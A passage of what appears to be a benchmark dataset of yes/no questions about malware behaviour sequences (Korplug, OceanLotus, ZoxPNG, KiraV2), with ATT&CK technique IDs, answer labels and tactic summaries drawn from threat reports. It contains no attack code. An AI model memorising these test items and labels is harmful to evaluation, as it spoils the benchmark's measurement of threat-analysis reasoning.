Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2653,61,61-Discovery-T1124-System Time Discovery,"After establishing persistence by creating a hidden and system-marked directory under %allusersprofile% and setting up a scheduled task or registry entry, is the Korplug variant likely to proceed with collecting information about the system, including using the GetSystemTime function for system time discovery, before exfiltrating data via a custom TCP-based protocol?","Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2655,61,61-Collection-T1025-Data from Removable Media,"After Korplug decrypts its encrypted configuration data and retrieves details such as system locale, hostname, and IP addresses during the Discovery phase, is it likely to collect data from removable media during the Collection phase?","Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2656,61,61-Collection-T1039-Data from Network Shared Drive,"After collecting metadata and content from local systems and removable media, is the Korplug malware likely to proceed with data exfiltration via an encrypted custom TCP-based protocol after gathering data from network shared drives?","Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2657,61,61-Command and Control-T1071-Application Layer Protocol,"After the Korplug variant collects data from the local system, removable media, and network shared drives, is it likely for Korplug to communicate with C&C servers using a custom TCP-based protocol, with the initial handshake over HTTPS or TCP, and subsequent encrypted communication over TCP?","Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2658,61,61-Command and Control-T1571-Non-Standard Port,"After collecting metadata and content from all mapped drives, removable media, and network shared drives, is Korplug likely to communicate with C&C servers using a custom TCP-based protocol over non-standard ports before performing data exfiltration via compressed and encrypted TCP messages?","Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2660,61,61-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After Mustang Panda's Korplug variant performs data discovery on the system, such as collecting metadata and content from all mapped drives, is it likely to use a custom protocol for data exfiltration over TCP involving compressed and encrypted messages?","Exfiltration: Data exfiltration is performed via the same custom protocol used to send and receive commands, involving TCP messages with a header followed by a compressed and encrypted message body.","Resource Development: ESET researchers discovered an ongoing campaign by Mustang Panda using a new Korplug variant named Hodur, which has been active since at least August 2021. The campaign targets research entities, internet service providers, and European diplomatic missions, leveraging current events in Europe, such as Russia's invasion of Ukraine, to lure victims with phishing documents. The group behind the campaign, attributed to Mustang Panda (also known as TA416, RedDelta, or PKPLUG), is known for targeting governmental entities and NGOs, primarily in East and Southeast Asia, with a focus on Mongolia. They have also targeted the Vatican in 2020. The campaign uses custom loaders for shared malware like Cobalt Strike, Poison Ivy, and Korplug, and is characterized by the use of anti-analysis techniques and control-flow obfuscation at every stage of the deployment process.
Initial Access: The initial access vector is not explicitly observed but is believed to involve phishing and watering hole attacks. The campaign uses filenames related to current events, such as 'COVID-19 travel restrictions EU reviews list of third countries.exe' and 'Situation at the EU borders with Ukraine.exe', to deliver a downloader that also opens a decoy document to distract the victim. These documents are often legitimate and publicly accessible, reflecting the filenames used.
Execution: Mustang Panda's campaign utilizes a custom loader to execute the new Korplug variant. The loader is a DLL that exploits a side-loading vulnerability in a legitimate, signed executable. The loader exports multiple functions, but only one function is responsible for loading the final malware stage. The loader function decrypts the encrypted Korplug file in memory and makes the buffer executable before calling into it.
Persistence: The Korplug variant establishes persistence by creating a directory under %allusersprofile%, marking it as hidden and system, and copying the necessary files to this directory. It then sets up persistence either by creating a scheduled task to run at boot or by adding a registry entry to Software\Microsoft\Windows\CurrentVersion\Run. The malware launches the executable from its new location and exits.
Defense Evasion: Mustang Panda's campaign features heavy use of control-flow obfuscation and anti-analysis techniques at every stage of the deployment process. The downloader and loader use various methods to obfuscate the control flow, including junk code, opaque predicates, and encrypted stack strings. The Korplug file is encrypted and only decrypted at runtime, and its configuration data is encrypted with XOR. The directories created during the installation process are set as hidden system directories, and the malware can run commands on a hidden desktop.
Discovery: The Korplug variant collects extensive information about the system, including uptime, Windows version, CPU clock rate, amount of RAM, and display resolution. It also retrieves the system locale, hostname, and IP addresses, and uses GetSystemTime to retrieve the current system time.
Collection: Korplug collects data from the local system, removable media, and network shared drives. It can list files and directories along with their attributes and content, and collects metadata and content from all mapped drives.
Command and Control: Korplug communicates with C&C servers using a custom TCP-based protocol. The initial handshake can be done over HTTPS or TCP, and subsequent communication is always done over TCP. The communication is encrypted using RC4 and may use non-standard ports. The configuration contains fallback C&C servers, and Korplug can download additional files from the C&C server.
Others: The campaign uses filenames that reflect current events to lure victims, demonstrating Mustang Panda's ability to quickly react to world events. The group iteratively improves its tools, including the use of trident downloaders to deploy Korplug. ESET Research offers private APT intelligence reports and data feeds, and inquiries can be directed to threatintel@eset.com.",Yes,"Mustang Panda’s Hodur_ Old tricks, new Korplug variant _ WeLiveSecurity"
2663,62,62-Command and Control-T1071-Application Layer Protocol,"After the attackers executed 'Backdoor.Agent.Hza' on the infected SK Communications computers to establish backdoor access and installed additional malware to access user databases, is it likely that these infected computers communicated with the command and control server while the domain 'update.alyac.org' resolved to the South Korean IP address 116.127.121.41?","Command and Control: The infected computers communicated with a command and control server using the domain 'update.alyac.org', which resolved to the South Korean IP address 116.127.121.41. The attackers used this infrastructure to monitor and control the infected computers, and to facilitate the theft of personal information from the user databases.","Initial Access: The attackers initially compromised a server belonging to a South Korean software company, ESTsoft, which was used to deliver software updates to customers, including SK Communications. Between July 18 and 25, 2011, the attackers modified the server to distribute a trojaned update file to SK Communications computers during routine checks for software updates. This trojaned update file contained the malware 'Backdoor.Agent.Hza', which subsequently infected over 60 SK Communications computers.
Execution: The malware 'Backdoor.Agent.Hza', dropped by the trojaned update file, executed on the infected SK Communications computers, establishing a backdoor for the attackers. The malware communicated with a command and control server located at the South Korean IP address 116.127.121.41 on TCP port 8080. The attackers also installed additional malware named 'nateon.exe' on at least one of the infected computers, which was used to access the user databases.
Defense Evasion: The attackers used a legitimate software update process as a means of delivering the trojaned update, effectively turning a security practice into a vulnerability. The security of software updates is usually trusted implicitly, and the exploitation of this trust relationship went undetected by SK Communications for some time.
Exfiltration: The attackers exfiltrated the personal details of up to 35 million SK Communications customers from the user databases to a waypoint, purportedly belonging to a company based in Seoul's Nonhyeon neighborhood. The personal information included names, phone numbers, home and email addresses, birth dates, gender details, user identifiers, passwords, and resident registration numbers due to South Korea's Real Name System in place at the time.",Yes,C5_APT_SKHack
2664,63,63-Initial Access-T1566-Phishing,Is the OceanLotus backdoor likely to execute a hidden file named .CFUserEncoding and display a decoy document after being delivered via an email attachment as part of a phishing campaign?,"Initial Access: The OceanLotus backdoor is distributed via a zip file, presumed to be delivered through an email attachment. The zip file contains a directory with a file disguised as a Microsoft Word document icon, which is actually an application bundle containing executable code. When the user attempts to open the decoy Word document, the Trojan executes and displays a decoy document to mask its execution.","Execution: The OceanLotus backdoor, once executed, opens a hidden file named .CFUserEncoding, a password-protected Word document, from the application bundle's Resources folder. It also copies this file to the executable path, replacing the application bundle after persistence is established, leading the victim to believe they have opened a legitimate Word document.
Persistence: The backdoor creates a Launch Agent that runs when the victim's host starts up, differing from the previous version which executed upon user login. It copies itself to a location and filename based on the user's UID, using a segmented MD5 hash as a directory in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs for root users. The malware then deletes the original application bundle, leaving the decoy document, and launches itself as a service from the new location.
Defense Evasion: The backdoor avoids the use of command line utilities and suspicious strings, showing a deep understanding of macOS. It employs a robust string encoding mechanism to obfuscate its functions, making it less suspicious to static analysis. The malware also uses a custom binary protocol with encryption to communicate with its command and control server, an improvement over the previous version's simple XOR encoding.
Discovery: The backdoor surveys the victim's computer and sends the information back to the server. It gathers details such as the victim's name, machine serial number, and system information, which is then encrypted and sent to the command and control server.
Command and Control: The backdoor communicates with the command and control server using a custom binary protocol on TCP port 443. The communication sequence involves initiating a session, receiving an ephemeral encryption key and command from the server, executing the command, and sending back the results encrypted with AES in CBC mode. The server uses ephemeral keys for each session, enhancing the security of the communication.
Others: The OceanLotus backdoor is an advanced threat targeting victims in Vietnam with low AV detection. It has been active for over a year with recent communication with the command and control server as of early June 2017. The backdoor includes improvements such as a decoy document, custom binary protocol traffic with encryption, and a modularized structure. Apple has updated macOS protection systems to address this variant, and Palo Alto Networks customers are protected with classified samples, malicious domain and IP classifications, and IPS signatures. Indicators of compromise include various hashes, C2 server domains, and dropped files with specific paths based on the user's UID.",Yes,unit42-new-improved-macos-backdoor-oceanlotus
2669,63,63-Command and Control-T1105-Ingress Tool Transfer,"Before initiating command and control communication using a custom binary protocol encrypted with AES in CBC mode, is the OceanLotus backdoor likely to survey the victim's computer to gather details such as the victim's name and system information for transmission to its server?","Command and Control: The backdoor communicates with the command and control server using a custom binary protocol on TCP port 443. The communication sequence involves initiating a session, receiving an ephemeral encryption key and command from the server, executing the command, and sending back the results encrypted with AES in CBC mode. The server uses ephemeral keys for each session, enhancing the security of the communication.","Initial Access: The OceanLotus backdoor is distributed via a zip file, presumed to be delivered through an email attachment. The zip file contains a directory with a file disguised as a Microsoft Word document icon, which is actually an application bundle containing executable code. When the user attempts to open the decoy Word document, the Trojan executes and displays a decoy document to mask its execution.
Execution: The OceanLotus backdoor, once executed, opens a hidden file named .CFUserEncoding, a password-protected Word document, from the application bundle's Resources folder. It also copies this file to the executable path, replacing the application bundle after persistence is established, leading the victim to believe they have opened a legitimate Word document.
Persistence: The backdoor creates a Launch Agent that runs when the victim's host starts up, differing from the previous version which executed upon user login. It copies itself to a location and filename based on the user's UID, using a segmented MD5 hash as a directory in ~/Library/OpenSSL/ or /Library/TimeMachine/bin/mtmfs for root users. The malware then deletes the original application bundle, leaving the decoy document, and launches itself as a service from the new location.
Defense Evasion: The backdoor avoids the use of command line utilities and suspicious strings, showing a deep understanding of macOS. It employs a robust string encoding mechanism to obfuscate its functions, making it less suspicious to static analysis. The malware also uses a custom binary protocol with encryption to communicate with its command and control server, an improvement over the previous version's simple XOR encoding.
Discovery: The backdoor surveys the victim's computer and sends the information back to the server. It gathers details such as the victim's name, machine serial number, and system information, which is then encrypted and sent to the command and control server.
Others: The OceanLotus backdoor is an advanced threat targeting victims in Vietnam with low AV detection. It has been active for over a year with recent communication with the command and control server as of early June 2017. The backdoor includes improvements such as a decoy document, custom binary protocol traffic with encryption, and a modularized structure. Apple has updated macOS protection systems to address this variant, and Palo Alto Networks customers are protected with classified samples, malicious domain and IP classifications, and IPS signatures. Indicators of compromise include various hashes, C2 server domains, and dropped files with specific paths based on the user's UID.",Yes,unit42-new-improved-macos-backdoor-oceanlotus
2674,64,64-Command and Control-T1102-Web Service,"After executing arbitrary code supported by ZoxPNG via commands received from the C2 server, is it likely that the C2 server will respond with a PNG file containing the next instruction for continued Command and Control communication?","Command and Control: ZoxPNG communicates with the C2 server using HTTP requests, with the first GET request establishing initial contact. Subsequent requests may use GET or POST, depending on whether data needs to be sent to the C2 server. The C2 server responds with a PNG file containing the next instruction. ZoxPNG is resilient to network instability, retrying connections multiple times with delays.","Execution: ZoxPNG is a simple RAT that uses the PNG image file format for data transmission with the C2 server. It supports 13 native commands and can execute arbitrary code from the C2 server. ZoxPNG requires the attacker to specify the C2 server address as a command line argument. Upon activation, it registers command handlers and enters a loop for communication and command dispatch, attempting to reconnect to the C2 server after any communication failures.
Defense Evasion: ZoxPNG uses the WinInet API for HTTP communication, which allows it to automatically use proxy settings configured on the victim's machine. It sends a VictimSystemData structure in the HTTP Cookie header, which includes a checksum of the victim's computer name to detect corrupt or forged requests. The communication pattern includes HTTP GET and POST requests with a PNG file containing instructions or data.
Others: ZoxPNG's communication with the C2 server is based on a polling model, with the binary attempting to contact the C2 server up to five times with 5-second intervals between attempts. The communication subsystem uses standard Base64 encoding to transfer data without NULL byte issues. The PNG file format is used for data transmission, adhering to the PNG standard to reduce detectability. ZoxPNG can be detected over the network by looking for a specific static string in the traffic. On disk, the same string can be used for detection with a YARA signature. Known samples of ZoxPNG have been identified, with some signed using a certificate from '4NB Corp.' The malware has evolved from an earlier variant known as ZoxRPC, which targeted specific regional versions of Windows and used the MS08-067 vulnerability.",Yes,ZoxPNG_Full_Analysis-Final
2677,65,65-Persistence-T1653-Power Settings,"After exploiting vulnerabilities in IoT devices through remote code execution for initial access and performing DDoS execution by binding to a local port for standalone operation, is KiraV2 likely to deactivate watchdog features and reset the watchdog timer to maintain persistence before encoding strings and changing process names to evade defenses?",Persistence: KiraV2 employs techniques to prevent system reboots and maintain its presence on infected devices. It deactivates watchdog features on multiple device paths to avoid system resets and periodically resets the watchdog timer to keep the device alive.,"Initial Access: The CTI report details a new Mirai variant, KiraV2, which exploits vulnerabilities in IoT devices for initial access. It targets devices such as MVPower DVR with JAWS Web Server and Huawei routers by leveraging a remote code execution vulnerability. KiraV2 also retains Mirai's method of using telnet brute-force attacks to compromise devices with weak credentials.
Execution: KiraV2 malware, an enhanced version of Mirai, executes various DDoS attacks and distributes itself to vulnerable IoT devices. It uses encoded strings for C&C server communication and employs anti-analysis techniques like changing process names and encoding strings to disrupt analysis. The malware also ensures standalone execution by binding to a local port and confirming normal execution by printing a designated string.
Defense Evasion: KiraV2 uses anti-analysis techniques such as encoding strings and changing process names to evade detection. It also employs a signal handler registration method to hide the real C&C server address from analysis.
Credential Access: KiraV2 conducts telnet dictionary attacks using a list of common credentials to gain unauthorized access to IoT devices. It targets environments where telnet is installed and busybox is present, indicating a focus on devices with weak telnet account information.
Command and Control: KiraV2 communicates with a C&C server using hard-coded IP addresses and encoded port numbers. It periodically communicates with the C&C server to receive commands and execute DDoS attacks.
Impact: KiraV2's primary impact is through DDoS attacks. It supports various types of DDoS attacks, such as UDP flooding and TCP ACK flooding, to disrupt the availability of targeted services and infrastructure.
Others: The report emphasizes the importance of changing default device credentials and updating IoT devices to the latest versions to prevent vulnerability exploitation. AhnLab's anti-malware product, AhnLab V3, detects Mirai malware under the alias Worm/Linux.Mirai.SE189.",Yes,ASEC_REPORT_vol.100_ENG
2679,65,65-Command and Control-T1571-Non-Standard Port,"After employing anti-analysis techniques to evade detection by encoding strings and changing process names, is KiraV2 likely to communicate with a C&C server and periodically receive commands for executing DDoS attacks?",Command and Control: KiraV2 communicates with a C&C server using hard-coded IP addresses and encoded port numbers. It periodically communicates with the C&C server to receive commands and execute DDoS attacks.,"Initial Access: The CTI report details a new Mirai variant, KiraV2, which exploits vulnerabilities in IoT devices for initial access. It targets devices such as MVPower DVR with JAWS Web Server and Huawei routers by leveraging a remote code execution vulnerability. KiraV2 also retains Mirai's method of using telnet brute-force attacks to compromise devices with weak credentials.
Execution: KiraV2 malware, an enhanced version of Mirai, executes various DDoS attacks and distributes itself to vulnerable IoT devices. It uses encoded strings for C&C server communication and employs anti-analysis techniques like changing process names and encoding strings to disrupt analysis. The malware also ensures standalone execution by binding to a local port and confirming normal execution by printing a designated string.
Persistence: KiraV2 employs techniques to prevent system reboots and maintain its presence on infected devices. It deactivates watchdog features on multiple device paths to avoid system resets and periodically resets the watchdog timer to keep the device alive.
